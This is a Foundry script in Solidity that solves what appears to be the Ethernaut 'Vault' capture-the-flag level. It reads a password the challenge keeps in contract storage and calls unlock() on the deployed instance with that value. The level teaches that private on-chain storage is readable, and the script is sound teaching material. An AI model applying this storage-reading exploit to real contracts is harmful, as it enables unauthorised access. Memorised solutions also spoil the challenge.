// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/*
    Unlock the vault to pass the level!

    Solution 1: Use block explorer on the deployment transaction to read the variable passed into the constructor
    Solution 2: Use cast and foundry to read the storage slot 0 of the Vault contract
 */
contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0x55889a0242F6A53C41f3edd871D7Ef5c6AC2851c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();

        require(vaultInstance.locked() == false);
    }
}